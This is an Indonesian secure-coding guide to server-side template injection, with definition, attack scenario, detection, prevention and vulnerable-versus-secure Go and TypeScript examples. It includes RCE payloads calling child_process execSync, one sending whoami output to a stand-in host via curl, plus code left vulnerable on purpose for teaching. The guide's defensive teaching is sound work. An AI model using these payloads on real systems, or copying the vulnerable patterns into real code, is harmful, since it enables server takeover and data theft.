# Server-Side Template Injection (SSTI)

> **Metadata Keamanan:**
> - **CWE**: [CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine](https://cwe.mitre.org/data/definitions/1336.html)
> - **OWASP**: [A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
> - **Tingkat Keparahan (Severity)**: Critical (CVSS ~ 9.0 - 9.8)

---

## 1. Pengertian

**Server-Side Template Injection (SSTI)** adalah celah keamanan di mana penyerang dapat menyuntikkan sintaks *template engine* ke dalam templat yang dievaluasi di sisi server, memungkinkan eksekusi kode server secara langsung (*Remote Code Execution*).

**Analogi Sederhana:**  
Bayangkan Anda memesan sertifikat penghargaan online dan mengisi kolom nama:  
`Nama Penerima: [ ... ]`

Sistem mencetak: "Selamat kepada `{{ nama }}` atas prestasinya."  
Namun Anda mengisi kolom dengan:  
`{{ hapus_seluruh_arsip_kantor() }}`  
Jika mesin cetak tersebut begitu ceroboh hingga mengevaluasi teks di dalam kurung kurawal sebagai instruksi resmi mesin (bukan sekadar teks nama orang), mesin tersebut akan menghapus arsip kantor saat mencetak sertifikat.

---

## 2. Cara Kerja

Template engine (seperti Jinja2, Twig, Handlebars, EJS, Pug) digunakan untuk menggabungkan data dinamis dengan tata letak dokumen (HTML/Email/PDF):

```html
<!-- Pola yang Benar: Template statis, data dipassing terpisah -->
Hello {{ user.name }}
```

Namun, SSTI terjadi ketika developer menggabungkan input pengguna **langsung ke dalam string definisi templat sebelum templat dikompilasi**:

```javascript
// Pola Salah: String template dirangkai dari input pengguna
const templateString = `Hello ${req.body.name}!`;
const rendered = templateEngine.render(templateString);
```

Jika pengguna memasukkan `{{ 7 * 7 }}`, template engine mengevaluasi matematika tersebut di server dan menghasilkan `Hello 49!`. Dari titik ini, penyerang dapat memanfaatkan objek lingkungan bawaan template engine untuk mengakses sistem operasi server.

---

## 3. Penyebab

- **Menjadikan Input Pengguna Sebagai String Template**: Menggunakan template literal atau penggabungan string untuk membuat badan template, bukan melewatkan input sebagai variabel konteks (*context data*).
- **Penggunaan Template Engine Tanpa Sandbox**: Banyak template engine mengizinkan akses ke fungsi bawaan runtime (seperti `process.mainModule.require` di Node.js atau objek global) tanpa mode isolasi (*sandboxed execution*).

---

## 4. Skenario Serangan

1. **Uji Coba Deteksi (Probe)**: Penyerang mengirim input matematika templat sederhana seperti `{{ 7 * 7 }}` atau `${ 7 * 7 }` pada form kustomisasi pesan email.
2. **Konfirmasi Respon**: Email yang diterima penyerang tidak menampilkan `{{ 7 * 7 }}`, melainkan angka `49`. Ini membuktikan input dieksekusi di server.
3. **Eksplorasi Objek (Object Traversing)**: Penyerang memanfaatkan hierarki objek template engine untuk mencari fungsi eksekusi sistem.
4. **Eskalasi ke RCE**: Mengirimkan payload khusus template engine untuk memanggil terminal:
   Misalnya pada mesin template berbasis JS:
   `{{ root.process.mainModule.require('child_process').execSync('id') }}`.

---

## 5. Dampak

- **Remote Code Execution (RCE)**: Penyerang memperoleh akses terminal langsung ke server tempat aplikasi berjalan.
- **Pencurian Kunci Rahasia**: Penyerang dapat membaca berkas konfigurasi, file `.env`, dan kredensial database.
- **Pengambilalihan Server Total**: Server dapat diubah menjadi botnet atau disusupi backdoor permanen.

---

## 6. Bagian Sistem yang Terdampak

- Fitur kustomisasi template email atau notifikasi otomatis oleh pengguna.
- Fitur pembuatan kuitansi, invoice, atau laporan PDF dinamis.
- Sistem Content Management System (CMS) yang mengizinkan admin mengedit tema template langsung dari dashboard.

---

## 7. Contoh Kasus Nyata dalam Sebuah Sistem

> *Catatan: Kasus berikut adalah simulasi edukatif yang realistis untuk mempermudah pemahaman.*

**Sistem Faktur Kustom InvoiceKu:**  
InvoiceKu adalah platform SaaS penagihan. Pengguna premium diberikan fitur untuk menyesuaikan template catatan kaki (*footer note*) kuitansi pembayaran yang dikirimkan ke pelanggan.

Developer InvoiceKu merender template kuitansi dengan:
```javascript
const template = pug.compile(`div.footer ${userFooterNote}`);
const html = template(data);
```

Seorang penyerang memasukkan teks footer:
```text
#{function(){ local_process.mainModule.require('child_process').execSync('curl http://attacker.site/leak?d=$(whoami)') }()}
```

Saat faktur digenerate untuk dikirim, server InvoiceKu mengeksekusi perintah shell `whoami` dan mengirimkan hasilnya ke server penyerang.

---

## 8. Cara Mendeteksi

- **SAST**: Mendeteksi pola di mana fungsi kompilasi template (seperti `compile()`, `render()`) menerima parameter yang berasal dari `req.body` atau `req.query`.
- **Fuzzing & DAST**: Mengirim payload ekspresi template universal: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`.
- **Audit Kode**: Pastikan seluruh template bersifat statis dan tersimpan di file fisik berkas, bukan dibuat dinamis secara runtime dari teks masukan pengguna.

---

## 9. Pencegahan

1. **Pisahkan Template dan Data (Utama)**: Template harus berupa file statis yang telah ditentukan sebelumnya oleh developer. Data pengguna hanya boleh diteruskan sebagai variabel konteks (*data context*), tidak boleh menjadi bagian dari sintaks template itu sendiri.
2. **Gunakan Engine Template Logik-Minimal (Logic-less Template)**: Gunakan template engine yang membatasi eksekusi kode acak, seperti Mustache atau Handlebars dengan konfigurasi aman.
3. **Aktifkan Sandboxing**: Jika sistem Anda mengharuskan pengguna menulis template (seperti CMS), jalankan proses rendering di dalam lingkungan sandbox yang terisolasi ketat (seperti WebAssembly sandbox atau VM terpisah) tanpa akses ke `require`, `os`, atau `process`.

---

## 10. Penanganan

1. **Nonaktifkan Fitur Edit Template Dinamis Sementara**: Blokir fitur pembuatan template khusus hingga kode diperbaiki.
2. **Audit Berkas dan Proses Server**: Periksa apakah ada file asing yang dibuat di direktori sementara (`/tmp`) atau proses mencurigakan yang sedang berjalan.
3. **Refactor ke Template Statis**: Ubah alur kerja agar pengguna hanya dapat memilih parameter (seperti warna, font, logo), bukan mengedit kode sintaks template secara mentah.

---

## 11. Contoh Implementasi

### A. Contoh dalam Golang (`text/template` vs `html/template`)

```go
package main

import (
	"bytes"
	"html/template"
	"net/http"
)

// ❌ KODE RENTAN (Vulnerable)
// Input pengguna dimasukkan ke dalam definisi template itu sendiri
func GenerateGreetingVulnerable(w http.ResponseWriter, r *http.Request) {
	userName := r.URL.Query().Get("name")

	// Jika pengguna memasukkan sintaks template Go yang mengevaluasi fungsi internal
	tmplStr := "Halo " + userName + ", selamat datang di portal kami!"
	tmpl, _ := template.New("greeting").Parse(tmplStr)

	tmpl.Execute(w, nil)
}

// ✅ KODE AMAN (Secure)
// Template bersifat statis, input pengguna dipassing secara ketat sebagai DATA konteks
var safeTmpl = template.Must(template.New("greeting").Parse("Halo {{ .Name }}, selamat datang di portal kami!"))

type GreetingData struct {
	Name string
}

func GenerateGreetingSecure(w http.ResponseWriter, r *http.Request) {
	userName := r.URL.Query().Get("name")

	// Apapun isi userName (meskipun mengandung "{{ ... }}"),
	// template engine hanya akan merendernya sebagai teks biasa!
	data := GreetingData{Name: userName}

	var buf bytes.Buffer
	safeTmpl.Execute(&buf, data)
	w.Write(buf.Bytes())
}
```

### B. Contoh dalam TypeScript (Node.js & Handlebars / EJS)

```typescript
import Handlebars from 'handlebars';

// ❌ KODE RENTAN (Vulnerable)
// Kompilasi template dilakukan dari string yang digabung dengan input pengguna
export function renderEmailVulnerable(userCustomHeader: string, recipientName: string) {
  // Jika userCustomHeader = "{{#with this as |root|}}...{{/with}}"
  const rawTemplate = `<h1>${userCustomHeader}</h1><p>Halo ${recipientName}</p>`;
  const compiled = Handlebars.compile(rawTemplate);
  return compiled({});
}

// ✅ KODE AMAN (Secure)
// Template telah didefinisikan secara statis. Input pengguna hanya mengisi variabel data.
const STATIC_EMAIL_TEMPLATE = `
  <h1>{{headerTitle}}</h1>
  <p>Halo {{recipientName}}</p>
`;

const compiledEmailTemplate = Handlebars.compile(STATIC_EMAIL_TEMPLATE);

export function renderEmailSecure(userCustomHeader: string, recipientName: string) {
  // Input pengguna dilewatkan sebagai objek data
  return compiledEmailTemplate({
    headerTitle: userCustomHeader, // Nilai "{{ 7 * 7 }}" tidak akan dievaluasi, hanya dicetak apa adanya
    recipientName: recipientName,
  });
}
```

---

## 12. Pengujian dan Verifikasi

### Pengujian Lokal dengan Payload Matematika
Kirim input ekspresi kurung kurawal pada endpoint:
```bash
curl -X GET "http://localhost:8080/api/email/preview?name=%7B%7B7*7%7D%7D"
```
*(Catatan: `%7B%7B7*7%7D%7D` adalah URL-encoded dari `{{7*7}}`)*

- **Kondisi Rentan**: Halaman menampilkan teks `Halo 49, selamat datang...`.
- **Kondisi Aman**: Halaman menampilkan teks persis `Halo {{7*7}}, selamat datang...`. Teks kurung kurawal dicetak murni tanpa dievaluasi.

---

## Referensi

- [PortSwigger: Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [MITRE CWE-1336](https://cwe.mitre.org/data/definitions/1336.html)
- [OWASP Testing Guide: Testing for SSTI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-Side_Template_Injection)
